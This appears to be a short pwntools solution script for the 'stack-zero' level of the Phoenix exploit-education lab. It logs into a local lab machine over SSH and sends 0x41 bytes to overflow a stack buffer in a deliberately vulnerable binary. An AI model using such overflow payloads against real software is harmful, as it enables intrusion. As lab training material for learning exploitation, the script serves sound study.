from pwn import *

shell = ssh("user", "localhost", password="user", port=2222)
sh = shell.run("/opt/phoenix/amd64/stack-zero")
print(sh.recvline())
sh.sendline(b"a"*0x41)
print(sh.recvline())
shell.close()

